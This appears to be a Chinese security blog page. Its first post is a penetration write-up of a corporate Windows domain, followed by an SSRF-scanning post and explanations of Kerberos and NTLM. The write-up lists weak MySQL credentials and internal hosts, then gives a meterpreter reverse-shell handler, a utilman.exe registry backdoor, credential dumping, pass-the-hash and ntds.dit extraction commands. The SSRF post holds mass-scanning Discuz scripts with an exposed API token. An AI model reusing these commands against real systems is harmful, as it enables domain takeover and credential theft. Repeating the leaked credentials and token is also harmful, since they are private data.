-<h1 id="0x01-后渗透的开始"><a href="#0x01-后渗透的开始" class="headerlink" title="0x01 后渗透的开始"></a>0x01 后渗透的开始</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">192.168.8.38:3306 mysql username:root,password:123456</span><br><span class="line"> z00382.dcxxx.com  D:\dev_software\mysql-5.6.24-winx64</span><br><span class="line"> </span><br><span class="line">192.168.8.116:3306 mysql username:root,password:123456</span><br><span class="line"> x00552.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.8.123:3306 mysql username:root,password:root </span><br><span class="line">z00529.dcxxx.com  C:/Program Files/MySQL/MySQL Server 5.5/</span><br><span class="line"></span><br><span class="line">192.168.9.31:3306 mysql username:root,password:123456</span><br><span class="line">y00478.dcxxx.com    D:\fix_soft\mysql-5.7.22-winx64\</span><br></pre></td></tr></table></figure>
-<p>发现在域中，信息安全部 / 风险经营事业部 存在弱口令的mysql，在数据库内发现大量邮箱账户以及对应的AES加密后的密码，一波尝试未解开, 故还是使用UDF提权, 首先对其进行了一波系统信息收集。</p>
-<p>参考: <a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">利用MySQL UDF提权</a></p>
-<p>虽然有四个root权限，提权之路并不是那么的顺利，依然被趋势杀毒intercept了，但，视乎是域用户本地策略的缘故，还是成功的拿到了一台域主机的本地system权限。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c8b3f9b521a131dfebcc6" alt=""></p>
-<p>然后利用 powershell，进行反弹个meterpreter,进行后渗透，但查看进程无果，一样被拦的死死的。</p>
-<p>接下来的思路是:</p>
-<p>启用Guest账号 - &gt; 3389远程连接 -&gt; Mimikatz -&gt; Tscon-&gt; 进行横向移动 </p>
-<p>由于本地策略的问题，Guest没有权限进行rdp，后面发现本地存在xxx用户，</p>
-<p>为了加快进度，修改了本地xxx用户密码(不太优雅)，后面顺利的进入了桌面。</p>
-<p>原来进程里还有 360杀毒、趋势杀毒端，为了更好的维持权限，故丢个免杀上去。</p>
-<p>项目地址:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/secretsquirrel/the-backdoor-factory</span><br></pre></td></tr></table></figure>
-<p>原理：可执行二进制文件中有大量的00，这些00是不包含数据的，将这些数据替换成payload，并且在程序执行的时候，jump到代码段，来触发payload。 </p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c99d850f8dd30da7e8b16" alt="微信截图_20190316143725.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.111</span><br><span class="line">lhost =&gt; 192.168.1.111</span><br><span class="line">msf exploit(handler) &gt; set lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf exploit(handler) &gt; exploit -j </span><br><span class="line">//开启本地监听</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8c98b59b521a131dff73b8" alt=""></p>
-<p>此时的环境不被允许允许Mimikatz、 当然，离线提取lsass.exe 也是可以的，为了能更快的提取到 明文密码， 故没采用此方法。</p>
-<h1 id="0x02-再一次克服困难"><a href="#0x02-再一次克服困难" class="headerlink" title="0x02 再一次克服困难"></a>0x02 再一次克服困难</h1><p>通过注册表劫持实现后门，修改注册表的命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
-<p>由于是system权限，也就很简单的通过tscon进入了域用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcxxx.com/k00529</span><br></pre></td></tr></table></figure>
-<p>此时 已经凌晨十二点了，</p>
-<p>在小伙伴的协助下， 对python进行封装、使用laZagne对目标获取明文密码。</p>
-<p>幸运的是 我们获取到了k00529 这个域用户的所有信息、例如:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">主域dc:192.168.20.23 / sz1.dcxxx.com</span><br><span class="line">域管理员: 7个 .....</span><br><span class="line">跳板机:192.168.2.37 / 192.168.2.38</span><br><span class="line"></span><br><span class="line">Login: SMY\XXXXXX</span><br><span class="line">Password: XXXXX7900221A#*</span><br><span class="line"></span><br><span class="line">邮箱:mail.xxxx.com</span><br><span class="line">密码:XXXXXX</span><br><span class="line">堡垒机172.18.80.103  //办公网无法访问</span><br><span class="line"></span><br><span class="line">URL: &lt;http://svn.XXXX.com:80&gt; SVN Repo</span><br><span class="line">Login: k00529</span><br><span class="line">Password: XXXtest01 </span><br><span class="line"></span><br><span class="line">........</span><br></pre></td></tr></table></figure>
-<h1 id="0x03-横向移动"><a href="#0x03-横向移动" class="headerlink" title="0x03 横向移动"></a>0x03 横向移动</h1><p>通过k00529 域用户进入跳板机，发现未注销的用户token 极其多，完全可通过跳板机的凭证 进入 个人PC 机，由于时间为白天、易被管理员发现，就不得已实现。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8ca8082711cd74738fb839" alt=""></p>
-<p>从dump的数据中，发现这个域用户的密码有个规律 :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXtest01  XXX为固定名字 + test01 /test02 /test03</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cbe839b521a131d01c3b8" alt=""><br>通过规律、成功pth到近100+ 域用户，同样，幸运的是 其中有两个域管。</p>
-<p>这就意味的 dcxxx.com 这个域已经沦陷。</p>
-<p>接下来 就是获取域控下所有用户的hash</p>
-<p>用VSS卷影副本来获取域控中的ntds.dit 和system.hiv 文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\system.hiv</span><br></pre></td></tr></table></figure>
-<p>使用impacket 的 secretsdump.Py  从ntds.dit文件中转存储NTLM hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /root/impacket/examples/secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c8cb51ce67d0a40cbc8a460" alt=""></p>
-<p>这里使用nmap获取域用户对应的IP，定位在线目标，进行窃取资料。</p>
-<p>最终 从财务部门获取到该公司的下年计划，人员组织构架，财务报表，盈利情况，以及内部相关work文档等。</p>
-<p>进行放弃权限，删除后门，所有操作并未更改，下载，删除等一切损害该公司的行为。</p>
-<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>1、在行动之前思考几分钟，有没有更好的办法<br>2、思考一个问题多个解决方案的利弊<br>3、选取自己熟悉的协议进行信息搜集<br>4、网络命令一定要熟<br>5、对于后门要加强维护<br>6、渗透的本质是信息搜集，每一次的项目如果碰到迷茫无解的时候，请继续搜集。而信息搜集的本质是渗透的沉思。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/02/06/两种使用python实现SSRF检测/">python实现SSRF检测脚本</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-02-06</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <p>咸鱼了一周，在家的感觉真好，就是时间长了人就有惰性了。</p>
-<p>非常简单的检测思路:<br>在本地监听socks端口 -&gt;  发送payload -&gt; 收到回显 -&gt; 检测成功 </p>
-<p>不过在本地检测就有点不太友好了，需要获取到公网IP地址(这里使用os从命令行获取)，然后监听 0.0.0.0,利用多线程, 前提还需要有VPS，或端口转发给路由。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">discuz论坛forum.php参数message SSRF漏洞检测</span><br><span class="line">author = &apos;c1y2m3&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">port = 8999</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">    ip = &quot;0.0.0.0&quot; </span><br><span class="line">    print &quot;本地监听端口&#123;&#125;&quot;.format(port)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((ip, port))</span><br><span class="line">    sock.listen(10)</span><br><span class="line">    sock.settimeout(50)</span><br><span class="line">    while True:</span><br><span class="line">        connection, address = sock.accept()</span><br><span class="line">        try:</span><br><span class="line">            connection.settimeout(1)</span><br><span class="line">            print address</span><br><span class="line">            print &quot;目标存在discuz/forum.php参数message/SSRF漏洞&quot;</span><br><span class="line">        except socket.timeout:</span><br><span class="line">            print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">        break</span><br><span class="line">        connection.close()</span><br><span class="line"></span><br><span class="line">def curl():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    command = &apos;curl ifconfig.me &apos;</span><br><span class="line">    r = os.popen(command)</span><br><span class="line">    info = r.readlines()</span><br><span class="line">    for line in info:</span><br><span class="line">        line = line.strip(&apos;\r\n&apos;)</span><br><span class="line">    payload = &quot;/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://&#123;&#125;:&#123;&#125;/xx.jpg[/img]&amp;formhash=xxoo&quot;.format(</span><br><span class="line">        line,port)</span><br><span class="line">    try:</span><br><span class="line">        with open(&apos;url.txt&apos;,&apos;r+&apos;)as f:</span><br><span class="line">            for domain in f.readlines():</span><br><span class="line">                domain  = domain.strip(&apos;\r\n&apos;)</span><br><span class="line">                domain = domain + payload</span><br><span class="line">                response = requests.get(url=domain)</span><br><span class="line">                print response</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">for i in xrange(2):</span><br><span class="line">    t1 = threading.Thread(target=check)</span><br><span class="line">    t2 = threading.Thread(target=curl)</span><br><span class="line">    threads.append(t1)</span><br><span class="line">    threads.append(t2)</span><br><span class="line">for i in xrange(2):</span><br><span class="line">    threads[i].start()</span><br><span class="line">for i in xrange(2):  # join()方法等待线程完成</span><br><span class="line">    threads[i].join()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
-<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>利用ceye.io这个平台的API去实时监控，效果也是不错的。</p>
-<p>ceye.io API调用获取信息，个人中心可以看见API TOKEN，<a href="http://ceye.io/api" target="_blank" rel="noopener">API使用方法</a>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import urlparse</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf8&apos;)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">discuz论坛forum.php参数message SSRF漏洞检测</span><br><span class="line">author = &apos;c1y2m3&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ceyeapi =&quot;http://g7i2n6.ceye.io/&quot;</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line"></span><br><span class="line">    api = &quot;http://api.ceye.io/v1/records?token=647e03c707b3cac32af337fc78ee5039&amp;type=http&amp;filter=jpg&quot;</span><br><span class="line">    r = requests.get(api)</span><br><span class="line">    json_data = json.loads(r.text)</span><br><span class="line">    for i in json_data[&apos;data&apos;]:</span><br><span class="line">        r = i[&apos;name&apos;]</span><br><span class="line">        response = r.replace(&quot;http://g7i2n6.ceye.io/&quot;,&quot;&quot;).replace(&apos;.jpg&apos;,&apos;&apos;).replace(&apos;http://g7i2n6.ceye.io:80/&apos;,&apos;&apos;)</span><br><span class="line">        print response + &quot; &quot; + &quot;目标存在discuz/forum.php参数message/SSRF漏洞&quot;</span><br><span class="line"></span><br><span class="line">def curl():</span><br><span class="line"></span><br><span class="line">    with open(&apos;url.txt&apos;, &apos;r+&apos;)as f:</span><br><span class="line">        for domain in f.readlines():</span><br><span class="line">            domain = domain.strip(&apos;\n&apos;)</span><br><span class="line">            url_change = urlparse.urlparse(domain)</span><br><span class="line">            url  = url_change.netloc</span><br><span class="line">            payload = &quot;/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]&#123;&#125;/&#123;&#125;.jpg[/img]&amp;formhash=xxoo&quot;.format(</span><br><span class="line">            ceyeapi,url)</span><br><span class="line">            domain = domain + payload</span><br><span class="line">            try:</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                response = requests.get(url=domain,verify=False)</span><br><span class="line">                print &quot;[+]正在检测,&#123;&#125;&quot;.format(domain)</span><br><span class="line">            except:</span><br><span class="line">                print &quot;Error&quot;</span><br><span class="line">    check()</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">t1 = threading.Thread(target=curl)</span><br><span class="line">threads.append(t1)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
-<p>最终效果：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c5b324ee67d0a629aea6eb6" alt=""></p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/01/22/Kerberos域认证/">理解Kerberos域认证</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-01-22</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="Active-Directory-活动目录-概念："><a href="#Active-Directory-活动目录-概念：" class="headerlink" title="Active Directory(活动目录)概念："></a>Active Directory(活动目录)概念：</h1><p>​    Windows 提供了为该企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载在线管理机制的就是活动目录。如果要搭建一个域，就需要安装活动目录服务。<br>​<br>​    活动目录以域名来划分域的边界，域外就不属于管理范围，也就是说，一个域对应一个域名，域之间也可以相互信任。</p>
-<ul>
-<li>Active DireCtory 存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。Active DireCtory 使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎的逻辑的分层组织。</li>
-<li>网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。</li>
-</ul>
-<h1 id="Active-Directory-活动目录-功能"><a href="#Active-Directory-活动目录-功能" class="headerlink" title="Active Directory (活动目录)功能"></a>Active Directory (活动目录)功能</h1><ul>
-<li>服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务及客户端加入域管理并实施组策略。</li>
-<li>用户服务：管理用户域账户、用户信息、企业通讯录(与电子邮件系统集成)、用户组管理、用户身份证、用户授权管理等，按省实施组策略。</li>
-<li>资源管理：管理打印机、文件共享服务等网络资源。</li>
-<li>桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制，界面的功能的限制、应用程序执行特征、网络连接限制、安全配置限制等。</li>
-<li>应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。</li>
-</ul>
-<p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p>
-<p>这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p>
-<h1 id="域认证所参与的角色-三只狗头"><a href="#域认证所参与的角色-三只狗头" class="headerlink" title="域认证所参与的角色(三只狗头)"></a>域认证所参与的角色(三只狗头)</h1><p>Kerberos的标准是三只狗头，狗头分别代表以下角色：</p>
-<ul>
-<li>Client</li>
-<li>Server</li>
-<li>KDC(Key Distribution Center 密钥分发中心) = DC (Domain Controller)</li>
-</ul>
-<p>Kerberos认证协议的基础概念：<br>    票据(Ticket)：是网络对象互相访问的凭证。TGT(Ticket Granting Ticket)：入场券，通过入场券能够获得票据，是一种临时凭证的存在。<br>    KDC 负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它是由以下服务组成：</p>
-<ul>
-<li>Authentication Service：为client 生成TGT服务</li>
-<li>Tikcet Granting Service ：为client生成某个服务等ticket<br>另外还需要介绍一个类似于本机SAM的一个数据库：AD，全称叫account database，存储所有client的白名单，只有存 在于白名单的client才能顺利申请到TGT。</li>
-</ul>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c45b9279b521a6695dd2818" alt=""></p>
-<p>PS:从物理层面看，AD与KDC均为域控制器(Domain Controller)</p>
-<h1 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h1><ul>
-<li>client 向Kerberos 服务请求，希望获取服务server的权限。kerberos得到了这个消息，首先得判断client是否可信赖，也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，通过AS返回TGT给client。</li>
-<li>client得到TGT 后，继续向kerberos请求，希望获取访问server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。</li>
-<li>client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。</li>
-</ul>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c45b4cd9b521a6695dd0fac" alt=""></p>
-<p>首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p>
-<p>KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p>
-<ul>
-<li>Session Key用于客户端向TGS服务通信。</li>
-<li>域内所有网络对象的凭证都在AD中保存</li>
-</ul>
-<h1 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h1><p><img src="https://www.yunzhijia.com/microblog/filesvr/5c45d27450f8dd61e0744462" alt=""><br><img src="https://www.yunzhijia.com/microblog/filesvr/5c45d35cea3b4a77e69aa997" alt=""></p>
-<p>其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。<br>Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。<br>第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据，这个是后话了。</p>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5c45d45b9b521a6695dda91d" alt=""><br>    第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。<br>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p>
-<p>KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p>
-<p>验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p>
-<p>Ticket组成如下：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c45d4e9ea3b4a77e69aae6c" alt=""><br>Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c45d5099b521a6695ddab49" alt=""><br>在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p>
-<h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul>
-<li><p>Kerberos 协议设计的思路就是用来在不受信的环境下进行认证的协议。</p>
-</li>
-<li><p>krbtgt 账号的 NTLM Hash 理论上只存在于 KDC 中。这意味着 TGT 只能由 KDC 来解密。如果krbtgt 账号的NTLM Hash泄露了，那么 TGT 就能被解密甚至伪造。伪造的 TGT 叫做黄金票据。</p>
-</li>
-<li><p>Ticket 是由服务器计算机本身的 NTLM Hash 加密的，Client 不能解密。如果该Hash 泄露，那么就可以解密甚至伪造 Ticket。伪造的 Ticket 叫做白银票据。</p>
-</li>
-<li><p>在上述的流程中，涉及到时间戳 timestamp，由于它的存在，才使得被第三方获取了加密信息 A 、B、TGT不会在短时间内被暴力破解。timestamp 一般时间为8小时。</p>
-</li>
-<li><p>Kerberos 协议和 NTLM 协议都会使用 NTLM Hash 对生成的任意随机数加密，然后比对结果。 Kerberos 的主要区别在于添加了第三方——-KDC参与到认证过程中。</p>
-</li>
-<li><p>Client info 中包含域名信息、Client 名称等</p>
-</li>
-</ul>
-<p>校验通过后，认证成功，该票据会一直存在客户端内存中。</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post-abstract">
-            <div class="post-title">
-                <h2><a class="post-title-link" href="/c1y2m3.github.io/2019/01/21/浅析Windows网络认证/">浅析Windows网络认证</a></h2>
-            </div>
-            <div class="post-meta">
-                <span class="post-time">2019-01-21</span>
-                
-            </div>
-            <div class="post-content">
-                
-                    <h1 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h1><p>​    在内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后认证方式，没有信任机构。</p>
-<p>​    假设A主机与B主机属于通一个工作组环境，A想访问B主机上的资料，需要将一个存在于B主机上的账户凭证发送至B主机，经过认证才能访问B主机上的资源。</p>
-<p>​    这是我们接触比较多的SMB共享文件的案例，SMB的默认端口是445.</p>
-<p>​    早期的SMB协议就在网络上传输明文口令。后来出现LAN Manager Challenge/Response 验证机制，简称LM，它是如此简单以至很容易就被破解，现在又有了NTLM以及Kerberos。</p>
-<h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>​    NTLM是一种网络认证协议，它是基于挑战(challenge)/响应(Response)认证机制的一种认证模式。</p>
-<p>​    这个协议只支持Windows</p>
-<p>challenge / Response </p>
-<p><strong>NTLM协议的认证过程分为三步：</strong></p>
-<p> 协商 -&gt; 质询  -&gt; 验证</p>
-<p>协商：客户端主要在这一步向服务器确认协议的版本，是v1还是v2，当 然不止那么一点点。</p>
-<p>质询：就是挑战（challenge）/响应（Response）认证机制起作用的范畴，本小节主要讨论这个机制的运作流程。</p>
-<p>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</p>
-<h2 id="质询的完整过程："><a href="#质询的完整过程：" class="headerlink" title="质询的完整过程："></a>质询的完整过程：</h2><ul>
-<li><p>1.客户端向服务端发送用户信息(用户名请求)</p>
-</li>
-<li><p>2.服务器接收到请求，生成了一个16位的随机数，被称为”challenge” 使用登录用户名对应的NTLM Hash加密 challenge(16随机字符)，生成challenge1，同时，将challenge发送给用户端。 // Net NTLM Hash = NTLM Hash(Challenge)</p>
-</li>
-<li><p>3.客户端接收到challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p>
-<p>验证：服务器端收到客户端的Response后，比对challenge与response是否相等，若相等，则认证通过。</p>
-<p><strong>使用另外一种方式解读：</strong></p>
-<p>1.Server接受到Client发送的用户名后，判断本地账户列表是否有用户名share_user</p>
-<ul>
-<li>如果没有，返回认证失败，</li>
-<li>如果有，生成challenge，并且从本地查找share_user对应的NTLM Hash，使用NTLM Hash加密challenge，生成一个Net-NTLM Hash存在内存中，并将challenge发送给Client。</li>
-</ul>
-<ol start="2">
-<li><p>Clinet接受到Chanllenge后，将自己提供的share_user密码转换称NTLM hash，使用NTLM Hash加密成Chanllenge，这个结果叫Response,表现形式是Net-NTLM Hash，最后将Response发送给Server。</p>
-</li>
-<li><p>Server 接受到Client发送给Response，将Response 与之前的Net-NTLM Hash 进行比较，如果相等，则认证通过。</p>
-<p>注意：</p>
-<p>1、challenge 是Server产生的一个16字节随机数，每次认证都不同。</p>
-<p>2.Response的表现形式是Net-NTLM Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</p>
-</li>
-</ol>
-<p><img src="https://www.secpulse.com/wp-content/uploads/2019/01/image12.png" alt=""></p>
-</li>
-</ul>
-<h2 id="NTLM-V2-协议"><a href="#NTLM-V2-协议" class="headerlink" title="NTLM V2 协议 "></a>NTLM V2 协议 </h2><p>​    NTLM v1 与NTLM v2最显著的区别就是challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash。</p>
-<ul>
-<li><p>challenge:NTLm v1 的challenge 有8位，NTLM v2 的challenge为16位</p>
-</li>
